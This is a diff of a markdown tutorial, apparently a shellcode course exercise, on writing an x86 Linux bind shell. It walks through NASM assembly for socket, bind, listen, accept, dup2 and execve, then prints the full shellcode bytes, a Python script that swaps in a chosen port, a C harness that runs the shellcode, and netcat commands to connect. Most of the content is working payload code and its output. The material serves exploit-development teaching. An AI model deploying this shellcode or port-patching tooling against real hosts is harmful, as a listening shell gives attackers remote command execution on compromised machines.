@@ -18,9 +18,8 @@ The second step is to create a script which will make the port configuration eas
 
 A bind shell is a shell that binds to a specific port on the target host to listen for incoming connections.
 
-
 ### Example of bind shell TCP in C
-```
+```c
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <stdlib.h>
@@ -74,8 +73,8 @@ Now, let's get to work.
 
 The assembly code
 -
-The first step is to initialize the stack and the registers.
-```
+The first step is to initialize the stack and the registers:
+```nasm
 ;set the stack pointer
 
 mov ebp, esp
@@ -89,7 +88,7 @@ xor edx, edx
 ```
 
 The second step is to push the sockaddr_in struct in the stack:
-```
+```nasm
 ;Push sockaddr_in struct on the stack
 ;struct sockaddr_in addr;
 ;addr.sin_family = AF_INET;
@@ -104,7 +103,7 @@ push word 0x02      ;addr.sin_family = AF_INET
 ```
 
 We can now call the "socket" systemcall which will create an endpoint for communication:
-```
+```nasm
 ;int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
 mov ax, 0x167   ;socket syscall number
@@ -115,7 +114,7 @@ mov edi, eax    ;return value from the socket syscall
 ```
 
 Then, we need to call the "bind" systemcall which will bind to the socket:
-```
+```nasm
 ;bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
 xor eax, eax
@@ -128,7 +127,7 @@ int 0x80        ;Go for it
 ```
 
 Let's call the "listen" systemcall wich will listen for connections on the socket:
-```  
+```nasm 
 ;listen(sockfd, 0);
 
 xor eax, eax
@@ -139,7 +138,7 @@ int 0x80        ;Go for it
 ```
 
 The "accept" systemcall is used to accept a connection on the socket:
-```
+```nasm
 ;int connfd = accept(sockfd, NULL, NULL);
 
 xor eax, eax
@@ -171,7 +170,7 @@ dup:
 ```
 
 It's finaly the time to execute the shell:
-```
+```nasm
 ;execve("/bin/sh", NULL, NULL);
 
 xor eax, eax
@@ -186,7 +185,7 @@ int 0x80            ;Go for it
 ```
 
 You can find the whole code below:
-```
+```nasm
 ;Simple ASM (x86) bind shell on port 4444
 
 global _start
@@ -271,33 +270,41 @@ _start:
 ```
 
 Let's compile and execute it ("compile_nasm.sh" file can be found in the script folder): 
-```
+```bash
 #./compile_nasm.sh bind_shell
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Done!
 #./bind_shell
 ```
 
 We can check if the port 4444 is open using netstat:
-```
+```bash
 #netstat -antp | grep 4444
 ```
 
-We can now connect to this new port using for example netcat and get our shell
-```
+We can now connect to this new port using for example netcat and get our shell:
+```bash
 #nc -nv 127.0.0.1 4444
 ```
 
-# Configure the port 
+# Second step: make the port configuration easy
 
-## Get the hexadecimal code :
-```
-objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\x'. 
+
+Why ? Because our python script won't interpret our shellcode without this part.
+
+We can easily do that by using the following objdump command:
+```bash
+#objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 ```
 
-## The python script:
+Here is the result:
+```bash
+"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
 ```
+
+We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x11\\x5c' (which is 4444 in reverse hexadecimal) pattern and replace it by the port value asked by the user.
+
+Here is the code:
+```python
 #!/usr/bin/python3
 
 import sys
@@ -321,14 +328,20 @@ shellcode = shellcode.replace('\\x11\\x5c', '\\x{0}\\x{1}'.format(port[4:6],port
 print(shellcode)
 ```
 
-## Result:
-```
+This script will give us the following result:
+```bash
 #./modify_bind_shell.py 2222
-\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
 ```
 
-## C code (compilation script can be found in the script folder)
+Here is the result:
+```bash
+"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 ```
+
+In order to test it, we can now used this return and add it to a C program which will execute our shellcode
+
+The C program source code (this code can be found at root directory named test_shellcode.c)
+```c
 #include<stdio.h>
 #include<string.h>
 
@@ -347,17 +360,20 @@ main()
 }
 ```
 
-## Let's execute this code
-```
+Let's compile and execute this program (The 'compile_shellcode_file.sh' file can be found in the script directory):
+```bash
+#./scripts/compile_shellcode_file.sh test_shellcode
 #./test_shellcode 
 Shellcode Length:  117
+
 ```
-## Netstat 
-```
+We can use netcat to check if the port 2222 is open:
+```bash
 #netstat -antp | grep 2222
 ```
 
-## Conenct to port 
+Finaly, netcat can be used to access our bind shell 
+```bash
+#nc -nv 127.0.0.1 2222
 ```
-nc -nv 127.0.0.1 2222
-```
+
